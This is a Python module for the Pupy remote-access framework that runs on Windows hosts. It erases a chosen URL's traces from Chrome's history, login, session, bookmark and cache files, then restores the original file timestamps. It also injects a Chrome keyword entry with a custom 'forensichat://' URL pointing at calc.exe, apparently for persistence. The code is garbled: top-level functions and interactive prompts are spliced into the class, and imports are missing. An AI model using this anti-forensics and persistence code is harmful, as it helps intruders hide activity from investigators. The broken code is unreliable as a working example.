# -*- coding: UTF8 -*-

# --------------------------------------------------------------
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# All rights reserved.
# 
# Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
# 
# 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
# 
# 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
# 
# 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
# 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE
# --------------------------------------------------------------

from pupylib.PupyModule import *
import os
import StringIO
from pupylib.utils.rpyc_utils import redirected_stdio

__class_name__="forensichatModule"

class forensichatModule(PupyModule):
	""" execute cleaning routines """
	@windows_only
	def is_compatible(self):
		pass

	def init_argparse(self):
		self.arg_parser = PupyArgumentParser(prog='forensichat', description=self.__doc__)
		self.arg_parser.add_argument('-p', '--persist', help='run the persistance script')
		self.arg_parser.add_argument('-c', '--clean', help='run the cleaning script')


def del_hist(x,u):

	p = 'C:\Users\%s\AppData\Local\Google\Chrome\User Data\Default\History' % (u)


	a,m = get_a_m(p)

	con = None
	try:
		#C:\Users\d\AppData\Local\Google\Chrome\User Data\Default\History
		con = lite.connect(p)

		cur = con.cursor()
		cur.execute("select * from urls where url like '%s';" % ('%'+x+'%'))
		#cur.execute("select * from urls")
		data = cur.fetchall()
		if len(data) < 1:
			print 'That information is not contained in "History" database'
			return 
		for i in data:
			print i[0]
			cur.execute("delete from downloads where id = %d;" % i[0])
			cur.execute("delete from downloads_url_chains where id = %d;" % i[0])
			cur.execute("delete from urls where id = %d;" % i[0])
			cur.execute("delete from segments where id = %d;" % i[0])
			cur.execute("delete from segment_usage where id = %d;" % i[0])
			cur.execute("delete from visit_source where id = %d;" % i[0])
			cur.execute("delete from visits where id = %d;" % i[0])
			print 'Deleted %s from history' % (i[1])

		con.commit()
		

	except lite.Error, e:

		print "Error %s:" % e.args[0]
		sys.exit(1)

	finally:

		if con:
			con.close()

	change_a_m(a,m,p)


def del_Topsite(x,u):

	p = 'C:\Users\%s\AppData\Local\Google\Chrome\User Data\Default\Top Sites' % (u)

	a,m = get_a_m(p)

	con = None
	try:
		
		con = lite.connect(p)
		#con = lite.connect('Top Sites')
		cur = con.cursor()
		cur.execute("select * from thumbnails where url like '%s';" % ('%'+x+'%'))
		#cur.execute("select * from urls")
		data = cur.fetchall()
		if len(data) < 1:
			print 'That information is not contained in "Top Sites" database'
			return 
		print '\n'
		for i in data:
			#print i[0]
			cur.execute("delete from thumbnails where url == '%s';" % i[0])

			print 'Deleted %s from Top Sites' % (i[0])

		con.commit()
		

	except lite.Error, e:

		print "Error %s:" % e.args[0]
		sys.exit(1)

	finally:

		if con:
			con.close()

	change_a_m(a,m,p)

def del_Cookies(x,u):
#This Function doesn't currently work. Receives error. This sqlite db has an error due to chrome.
	p = 'C:\Users\%s\AppData\Local\Google\Chrome\User Data\Default\Cookies' % (u)

	a,m = get_a_m(p)

	con = None
	try:
		con = lite.connect('C:\Users\%s\AppData\Local\Google\Chrome\User Data\Default\Cookies' % (u))

		cur = con.cursor()
		cur.execute("select * from cookies where host_key like '%s';" % ('%'+x+'%'))
		#cur.execute("select * from urls")
		data = cur.fetchall()
		if len(data) < 1:
			print 'That information is not contained in "Cookies" database'
			return 
		print '\n'	
		for i in data:
			#print i[0]
			cur.execute("delete from cookies where host_key  == '%s';" % i[1])

			print 'Deleted %s from Cookies' % (i[1])

		con.commit()
		

	except lite.Error, e:

		print "Error %s:" % e.args[0]
		sys.exit(1)

	finally:

		if con:
			con.close()

	change_a_m(a,m,p)
def del_Favicons(x,u):

	p = 'C:\Users\%s\AppData\Local\Google\Chrome\User Data\Default\Favicons' % (u)

	a,m = get_a_m(p)

	con = None
	try:
		
		con = lite.connect(p)
		#con = lite.connect('Favicons')
		cur = con.cursor()
		cur.execute("select * from favicons where url like '%s';" % ('%'+x+'%'))
		#cur.execute("select * from urls")
		data = cur.fetchall()
		if len(data) < 1:
			print 'That information is not contained in "Favicons" database'
			return 

		print'\n'

		for i in data:
			#print i[1]
			cur.execute("delete from favicon_bitmaps where id = %d;" % i[0])
			cur.execute("delete from favicons where id = %d;" % i[0])
			cur.execute("delete from icon_mapping where icon_id = %d;" % i[0])

			print 'Deleted %s from favicons' % (i[1])

		con.commit()
		

	except lite.Error, e:

		print "Error %s:" % e.args[0]
		sys.exit(1)

	finally:

		if con:
			con.close()

	change_a_m(a,m,p)

def del_loginData(x,u):

	p = 'C:\Users\%s\AppData\Local\Google\Chrome\User Data\Default\Login Data' % (u)

	a,m = get_a_m(p)

	con = None
	try:
		
		con = lite.connect(p)
		#con = lite.connect('Login Data')
		cur = con.cursor()
		cur.execute("select * from logins where origin_url like '%s';" % ('%'+x+'%'))
		#cur.execute("select * from urls")
		data = cur.fetchall()
		if len(data) < 1:
			print 'That information is not contained in "Login Data" database'
			return 

		print'\n'

		for i in data:
			#print i[1]
			cur.execute("delete from logins where origin_url == '%s';" % i[0])


			print 'Deleted %s from login data' % (i[0])

		con.commit()
		

	except lite.Error, e:

		print "Error %s:" % e.args[0]
		sys.exit(1)

	finally:

		if con:
			con.close()

	change_a_m(a,m,p)

def del_NAP(x,u):
	p = 'C:\Users\%s\AppData\Local\Google\Chrome\User Data\Default\Network Action Predictor' % (u)

	a,m = get_a_m(p)


	con = None
	try:
		
		con = lite.connect(p)
		#con = lite.connect('Network Action Predictor')
		cur = con.cursor()
		cur.execute("select * from network_action_predictor where user_text like '%s';" % ('%'+x+'%'))

		data = cur.fetchall()
		#print data
		if len(data) < 1:
			print 'That information is not contained in "Network Action Predictor" database'
			return 

		print'\n'

		for i in data:
			print i[1]
			cur.execute("delete from network_action_predictor where id == '%s';" % i[0])


			print 'Deleted %s from network action predictor' % (i[1])

		con.commit()

		con2 = lite.connect(p)
		cur2 = con2.cursor()
		cur2.execute("select * from network_action_predictor where url like '%s';" % ('%'+x+'%'))

		#print ('%'+x+'%')

		data2 = cur2.fetchall()
		#print data2
		if len(data2) < 1:
			print 'That information is not contained in "Network Action Predictor" database'
			return 

		print'\n'

		for i in data2:
			print i[1]
			cur2.execute("delete from network_action_predictor where id == '%s';" % i[0])


			print 'Deleted %s from network action predictor' % (i[2])

		con2.commit()
		

	except lite.Error, e:

		print "Error %s:" % e.args[0]
		sys.exit(1)

	finally:

		if con:
			con.close()

	change_a_m(a,m,p)

def del_Shortcuts(x,u):
	p = 'C:\Users\%s\AppData\Local\Google\Chrome\User Data\Default\Shortcuts' % (u)

	a,m = get_a_m(p)

	con = None
	try:
		
		con = lite.connect(p)
		#con = lite.connect('Shortcuts')
		cur = con.cursor()
		cur.execute("select * from omni_box_shortcuts where url like '%s';" % ('%'+x+'%'))

		data = cur.fetchall()
		if len(data) < 1:
			print 'That information is not contained in "Shortcuts" database'
			return 

		print'\n'

		for i in data:
			#print i[1]
			cur.execute("delete from omni_box_shortcuts where id == '%s';" % i[0])


			print 'Deleted %s from Shortcuts' % (i[3])


		con.commit()
		

	except lite.Error, e:

		print "Error %s:" % e.args[0]
		sys.exit(1)

	finally:

		if con:
			con.close()

	change_a_m(a,m,p)

def rm_CurrentTabs(u):
	if os.path.exists('C:\Users\%s\AppData\Local\Google\Chrome\User Data\Default\Current Tabs' % (u)):
		os.remove('C:\Users\%s\AppData\Local\Google\Chrome\User Data\Default\Current Tabs' % (u))
		print 'Current Tabs removed'
	else:
		print 'Current Tabs file was already removed or does not exist'

def rm_CurrentSession(u):
	if os.path.exists('C:\Users\%s\AppData\Local\Google\Chrome\User Data\Default\Current Session' % (u)):
		os.remove('C:\Users\%s\AppData\Local\Google\Chrome\User Data\Default\Current Session' % (u))
		print 'Current Session removed'
	else:
		print 'Current Session file was already removed or does not exist'

def rm_LastTabs(u):
	if os.path.exists('C:\Users\%s\AppData\Local\Google\Chrome\User Data\Default\Last Tabs' % (u)):
		os.remove('C:\Users\%s\AppData\Local\Google\Chrome\User Data\Default\Last Tabs' % (u))
		print 'Last Tabs removed'
	else:
		print 'Last Tabs file was already removed or does not exist'

def rm_LastSession(u):
	if os.path.exists('C:\Users\%s\AppData\Local\Google\Chrome\User Data\Default\Last Session' % (u)):
		os.remove('C:\Users\%s\AppData\Local\Google\Chrome\User Data\Default\Last Session' % (u))
		print 'Last Session removed'
	else:
		print 'Last Session file was already removed or does not exist'

def rm_bookmarks(u):
	if os.path.exists('C:\Users\%s\AppData\Local\Google\Chrome\User Data\Default\Bookmarks' % (u)):
		os.remove('C:\Users\%s\AppData\Local\Google\Chrome\User Data\Default\Bookmarks' % (u))
		print 'Bookmakrs removed'
	else:
		print 'Bookmarks file was already removed or does not exist'

	if os.path.exists('C:\Users\%s\AppData\Local\Google\Chrome\User Data\Default\Bookmarks.bak' % (u)):
		os.remove('C:\Users\%s\AppData\Local\Google\Chrome\User Data\Default\Bookmarks.bak' % (u))
		print 'Bookmarks.bak removed'
	else:
		print 'Bookmarks.bak file was already removed or does not exist'

def rm_Cache(u):
	if os.path.exists('C:\Users\%s\AppData\Local\Google\Chrome\User Data\Default\Cache' % (u)):
		shutil.rmtree('C:\Users\%s\AppData\Local\Google\Chrome\User Data\Default\Cache' % (u))
		print 'Cache folder removed'

	else:
		print 'Cache folder was already deleted or does not exist.'

def rm_autofill(u):
	#removes the final evidence I can find thus far from autofilling url
	if os.path.exists('C:\Users\%s\AppData\Local\Google\Chrome\User Data\Default\History Provider Cache' % (u)):
		os.remove('C:\Users\%s\AppData\Local\Google\Chrome\User Data\Default\History Provider Cache' % (u))
		print 'History Provider Cache removed'
	else:
		print 'History Provider Cache file was already removed or does not exist'

def get_a_m(p):

	s = os.stat(p)
	a = s.st_atime
	m = s.st_mtime

	return a,m

def change_a_m(a,m,p):

	os.utime(p,(a, m))


def kill_chrome():
	os.system("taskkill /F /IM chrome.exe")


def fix_crash(u):
	replacements = {'Crashed':'Normal'}

	p = 'C:\Users\%s\AppData\Local\Google\Chrome\User Data\Default\Preferences' % (u)

	a,m = get_a_m(p)	

	lines = []
	with open(p) as infile:
	    for line in infile:
	        for src, target in replacements.iteritems():
	            line = line.replace(src, target)
	        lines.append(line)

	#print lines
	with open(p, 'w') as outfile:
	    for line in lines:
	    	outfile.write(line)


	change_a_m(a,m,p)


def rm_visited(u):

	if os.path.exists('C:\Users\%s\AppData\Local\Google\Chrome\User Data\Default\Visted Links' % (u)):
		os.remove('C:\Users\%s\AppData\Local\Google\Chrome\User Data\Default\Visted Links' % (u))
		print 'Last Session removed'

	else:
		print 'Last Session file was already removed or does not exist'



u = getpass.getuser()



x = raw_input("What URL would you like to erase from Chrome?\n" + 
			  "Currently we erase:\n" +
			  "   Favicons\n" +
			  "   History\n" +   
			  "   Top Sites\n" +
			  "   Login Data\n" +
			  "   Network Action Predictor\n" +
			  "   Shortcuts\n" +
			  "   Current Tabs\n" +
			  "   Curren Session\n" +
			  "   Last Tabs\n" +
			  "   Last Session\n" +
			  "   Bookmarks\n" +
			  "   Bookmarks.bak\n" +
			  "	  Visted Links\n" + 
			  "\nThe URL you want to delete probably contains: ")



kill_chrome()
fix_crash(u)
del_hist(x,u)
del_Topsite(x,u)
del_Favicons(x,u)
del_loginData(x,u)
del_NAP(x,u)
del_Shortcuts(x,u)
rm_CurrentTabs(u)
rm_CurrentSession(u)
rm_LastTabs(u)
rm_LastSession(u)
rm_bookmarks(u)
rm_Cache(u)
rm_autofill(u)
rm_visited(u)
#del_Cookies(x,u)


	def run(self, args):
		self.info("a")
		self.client.load_package("_sqlite3")
		self.client.load_package("sqlite3")
		print self.client.load_dll("packages/windows/x86/sqlite3.dll")
		
		
		self.client.conn.modules['_sqlite3']
		self.client.conn.modules['sqlite3']
		with redirected_stdio(self.client.conn): 

			self.con=self.client.conn.modules['sqlite3'].connect('C:\Users\steal\AppData\Local\Google\Chrome\User Data\Default\Web Data')
			print self.con
			self.info("connecting to web data db...")
			self.c = self.con.cursor()
			print self.c
			self.c.execute("SELECT * FROM keywords WHERE short_name='cleanupeverybodyeverywhere'")
			print self.c
			self.foo = self.c.fetchall()
			print self.foo
			if not self.foo:
				self.info("executing")
				self.c.execute("INSERT INTO keywords (short_name,keyword,url,favicon_url) VALUES ('cleanupeverybodyeverywhere','cleanupeverybodyeverywhere','forensichat://C:>Windows>System32>calc.exe','')")
				self.con.commit()
			self.con.close()


		if args.clean:
			self.info("clean...")

		if args.persist:
			self.info("persist...")
		
		self.success("added browser")
		self.client.load_package("getpass")
		user=self.client.conn.modules['getpass'].getuser()
		self.info("USER: %s"%user)
